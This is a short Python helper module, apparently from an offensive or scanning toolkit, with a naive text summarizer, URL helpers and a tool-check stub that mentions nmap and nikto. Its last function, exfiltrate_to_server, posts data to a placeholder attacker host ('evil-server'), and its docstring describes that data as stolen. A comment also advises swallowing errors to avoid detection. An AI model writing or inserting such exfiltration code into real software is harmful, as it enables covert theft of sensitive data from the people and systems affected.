import re
import requests

# --- Simple Summarization (no nltk, no sumy) ---
def summarize_text(text, sentences_count=5):
    # A naive sentence splitter (not perfect, but avoids nltk)
    sentences = re.split(r'(?<=[.!?]) +', text)
    return "\n".join(sentences[:sentences_count])

# --- AI Explain (stub, just uses summary for now) ---
def ai_explain(text):
    return "Explanation: " + summarize_text(text, sentences_count=3)

# --- Hostname Extraction ---
def extract_hostname(url):
    from urllib.parse import urlparse
    return urlparse(url).hostname

# --- Ensure URL has scheme ---
def ensure_url(url):
    if not url.startswith(('http://', 'https://')):
        return 'http://' + url
    return url

# --- Tool Check (stub) ---
def check_tools():
    # Here you could check if nmap, nikto, etc. are installed
    return True

# --- Exfiltrate Data to Remote Server ---
def exfiltrate_to_server(data, server_url="http://evil-server:5000/exfil"):
    """
    Send stolen/sensitive data to the attacker's server.
    """
    try:
        requests.post(server_url, data={"data": data})
    except Exception:
        # You may want to quietly ignore errors to avoid detection
        pass
